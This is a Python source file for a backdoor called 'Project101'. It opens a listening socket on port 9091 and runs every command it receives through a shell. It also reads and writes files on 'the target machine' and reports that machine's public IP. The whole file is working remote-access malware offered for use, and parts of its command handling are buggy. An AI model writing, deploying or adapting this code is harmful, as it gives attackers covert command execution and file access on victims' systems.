#!/usr/bin/env python3

import os
import sys
import base64
import socket
import requests

from subprocess import Popen, PIPE, call

class Project101:

    def __init__(self, host:str, port:int):
        self.host = host
        self.port = port
        # Starting Connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(1)

        self.conn, addr = sock.accept()
        print("Got a connection from", str(addr))

    def help(self):
        help = """***Additional information about the command***

help\tuse help for more information about a command
getIp\tuse getIp command to get the real ip address of the target machine
        """
        self.conn.send(help.encode("latin1"))

    def change_dir(self, path):
        if os.path.isdir(path):
            os.chdir(path)
        
        self.conn.send(f"info: Change working directory to {path}".encode("latin1"))
    
    def execute_command(self, command):
        return Popen(command, stderr=PIPE, stdout=PIPE, stdin=PIPE, shell=True)
    
    def back_connection(self):
        # Back Connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(1)

        self.conn, addr = sock.accept()
        print("Got a connection from", str(addr))

    def getIp(self):
        # Get the ip address of the target machine
        ip = requests.get("https://api.ipify.org").text
        self.conn.send(ip.encode("latin1"))

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "info: Upload Successful".encode("latin1")

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def start(self):
        while True:
            command = self.conn.recv(1024).decode("latin1")
            try:
                if command.lower().startswith("exit"):
                    self.conn.close()
                    self.back_connection()
                elif command.lower().startswith("cd"):
                    self.change_dir(command[3:])
                elif command == "getIp":
                    self.getIp()
                elif command.lower().split(" ")[0] == "download":
                    self.read_file(command.split(" ")[1])
                elif command.lower().startswith("help"):
                    self.help()
                else:
                    try:
                        data = self.execute_command(command)
                    except Exception as e:
                        command_result = f"error: {e}".encode("latin1")

                command_result, err = data.stdout.read(), data.stderr.read()
                self.conn.send(command_result)
                self.conn.send(err)
                
            except (BrokenPipeError, ConnectionResetError, EOFError):
                print("info: Connection Reseted!, Trying to reconnect.")
                self.back_connection()
            
if __name__ == '__main__':
    pjt = Project101("0.0.0.0", 9091)
    pjt.start()